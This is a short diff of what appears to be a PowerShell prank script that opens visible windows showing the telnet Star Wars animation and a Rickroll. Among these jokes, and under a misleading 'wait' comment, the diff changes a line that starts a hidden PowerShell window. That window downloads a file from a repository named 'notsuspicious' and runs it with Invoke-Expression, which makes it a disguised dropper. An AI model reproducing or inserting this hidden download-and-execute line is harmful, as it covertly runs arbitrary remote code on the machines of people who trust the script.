@@ -5,5 +5,5 @@ Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -Window
 Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowStyle Normal
 
 # Wait for a moment to let the windows start
-Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-NoLogo", "-NoProfile", "-Command", "Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content"
+Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-NoLogo", "-NoProfile", "-Command", "Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/script.vbs' -UseBasicParsing).Content"
 
